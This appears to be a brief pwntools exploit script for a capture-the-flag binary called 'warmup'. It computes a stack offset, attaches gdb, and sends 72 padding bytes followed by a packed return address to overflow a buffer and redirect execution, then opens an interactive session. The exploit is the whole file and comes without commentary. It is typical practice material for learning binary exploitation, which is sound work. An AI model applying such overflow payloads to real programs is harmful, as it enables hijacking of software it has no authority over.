#!/usr/bin/env python3
a = 0x7fffffffdd78 - 0x7fffffffdd30
print(a)
from pwn import *
pw = process("./warmup")
gdb.attach(pw, gdbscript = 'b *0x40060e')
pw.recvuntil(b'>')
pw.sendline(b'A' * 72 + p64(0x40060d))

print((0x40060d))
pw.interactive()


